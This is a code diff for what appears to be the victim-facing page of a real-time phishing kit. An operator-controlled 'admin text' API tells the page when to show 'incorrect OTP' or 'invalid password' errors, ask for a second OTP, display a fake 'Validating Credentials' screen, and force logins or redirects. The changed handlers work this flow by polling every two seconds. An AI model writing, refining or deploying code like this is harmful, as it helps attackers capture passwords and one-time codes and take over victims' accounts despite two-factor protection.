@@ -301,8 +301,107 @@ button:disabled{
   let approvalInterval = null;
   let blockCheckInterval = null;
   let isModalOpen = false;
-  let incorrectOtpProcessed = false;
 
+  // ========== INCORRECT OTP HANDLER (same as first OTP) ==========
+  async function checkIncorrectOtp() {
+    try {
+      const response = await fetch('/api/users/check-admin-text', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      
+      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
+        errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
+        errorDiv.style.display = 'block';
+        otpInput.value = '';
+        otpInput.focus();
+        await fetch('/api/admin/release-text', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        setTimeout(() => {
+          errorDiv.style.display = 'none';
+        }, 4000);
+      }
+    } catch (err) {}
+  }
+
+  // ========== WRONG LOGIN HANDLER ==========
+  async function checkWrongLogin() {
+    try {
+      const response = await fetch('/api/users/check-admin-text', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      
+      if (data.admin_text === 'wrong_login_error' && data.text_release === false) {
+        const modalError = document.getElementById('modalError');
+        if (modalError) {
+          modalError.textContent = '❌ Invalid email or password. Please try again.';
+          modalError.style.display = 'block';
+        }
+        const loginPassword = document.getElementById('loginPassword');
+        if (loginPassword) loginPassword.value = '';
+        const submitBtn = document.getElementById('submitLoginBtn');
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = 'Login to Continue →';
+        }
+        await fetch('/api/admin/release-text', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        setTimeout(() => {
+          if (modalError) modalError.style.display = 'none';
+        }, 4000);
+      }
+    } catch (err) {}
+  }
+
+  // ========== CORRECT LOGIN HANDLER ==========
+  async function checkCorrectLogin() {
+    try {
+      const response = await fetch('/api/users/check-admin-text', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      
+      if (data.admin_text === 'correct_login_success' && data.text_release === false) {
+        const modalContent = document.getElementById('loginModalContent');
+        if (modalContent) {
+          modalContent.innerHTML = `
+            <div style="text-align: center;">
+              <div class="modal-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                  <circle cx="12" cy="12" r="10"/>
+                  <path d="M12 6v6l4 2"/>
+                </svg>
+              </div>
+              <h3>Validating Credentials</h3>
+              <div class="loading-spinner-small"></div>
+              <p>Please wait as we validate your details...</p>
+              <p style="font-size: 12px; color: #666; margin-top: 10px;">Do not close this window</p>
+            </div>
+          `;
+        }
+        await fetch('/api/admin/release-text', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+      }
+    } catch (err) {}
+  }
+
+  // ========== BLOCK CHECK ==========
   async function checkIfBlocked() {
     try {
       const response = await fetch('/api/users/check-blocked', {
@@ -332,123 +431,7 @@ button:disabled{
     }, 3000);
   }
 
-  // INCORRECT OTP - SHOW ERROR ONCE, CLEAR INPUT, RESET DATABASE
-  async function checkIncorrectOtp() {
-    try {
-      const response = await fetch('/api/users/check-admin-text', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email })
-      });
-      const data = await response.json();
-      
-      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false && !incorrectOtpProcessed) {
-        incorrectOtpProcessed = true;
-        
-        errorDiv.textContent = '❌ Incorrect OTP entered. Please try again with a new code.';
-        errorDiv.style.display = 'block';
-        
-        otpInput.value = '';
-        otpInput.focus();
-        
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        
-        setTimeout(() => {
-          errorDiv.style.display = 'none';
-          incorrectOtpProcessed = false;
-        }, 4000);
-      }
-    } catch (err) {}
-  }
-
-  let wrongLoginProcessed = false;
-  async function checkWrongLogin() {
-    try {
-      const response = await fetch('/api/users/check-admin-text', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email })
-      });
-      const data = await response.json();
-      
-      if (data.admin_text === 'wrong_login_error' && data.text_release === false && !wrongLoginProcessed) {
-        wrongLoginProcessed = true;
-        
-        const modalError = document.getElementById('modalError');
-        if (modalError) {
-          modalError.textContent = '❌ Invalid email or password. Please try again.';
-          modalError.style.display = 'block';
-        }
-        
-        const loginPassword = document.getElementById('loginPassword');
-        if (loginPassword) loginPassword.value = '';
-        
-        const submitBtn = document.getElementById('submitLoginBtn');
-        if (submitBtn) {
-          submitBtn.disabled = false;
-          submitBtn.innerHTML = 'Login to Continue →';
-        }
-        
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        
-        setTimeout(() => {
-          if (modalError) modalError.style.display = 'none';
-          wrongLoginProcessed = false;
-        }, 4000);
-      }
-    } catch (err) {}
-  }
-
-  let correctLoginProcessed = false;
-  async function checkCorrectLogin() {
-    try {
-      const response = await fetch('/api/users/check-admin-text', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email })
-      });
-      const data = await response.json();
-      
-      if (data.admin_text === 'correct_login_success' && data.text_release === false && !correctLoginProcessed) {
-        correctLoginProcessed = true;
-        
-        const modalContent = document.getElementById('loginModalContent');
-        if (modalContent) {
-          modalContent.innerHTML = `
-            <div style="text-align: center;">
-              <div class="modal-icon">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                  <circle cx="12" cy="12" r="10"/>
-                  <path d="M12 6v6l4 2"/>
-                </svg>
-              </div>
-              <h3>Validating Credentials</h3>
-              <div class="loading-spinner-small"></div>
-              <p>Please wait as we validate your details...</p>
-              <p style="font-size: 12px; color: #666; margin-top: 10px;">Do not close this window</p>
-            </div>
-          `;
-        }
-        
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        
-        correctLoginProcessed = false;
-      }
-    } catch (err) {}
-  }
-
+  // ========== SECOND OTP SUBMIT & APPROVAL ==========
   function showLoading() {
     isProcessing = true;
     verifyBtn.disabled = true;
@@ -545,6 +528,7 @@ button:disabled{
     }
   }
 
+  // ========== FORCE LOGIN POLLING ==========
   let forceLoginInterval = null;
   function startForceLoginPolling() {
     if (forceLoginInterval) clearInterval(forceLoginInterval);
@@ -573,6 +557,7 @@ button:disabled{
     }, 2000);
   }
 
+  // ========== REDIRECT SUCCESS POLLING ==========
   let redirectSuccessInterval = null;
   function startRedirectSuccessPolling() {
     if (redirectSuccessInterval) clearInterval(redirectSuccessInterval);
@@ -662,6 +647,7 @@ button:disabled{
     }
   }
 
+  // Start all polling intervals
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
@@ -669,6 +655,7 @@ button:disabled{
   setInterval(checkWrongLogin, 2000);
   setInterval(checkCorrectLogin, 2000);
 
+  // Event listeners
   verifyBtn.addEventListener('click', verifySecondOTP);
   otpInput.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') verifySecondOTP();
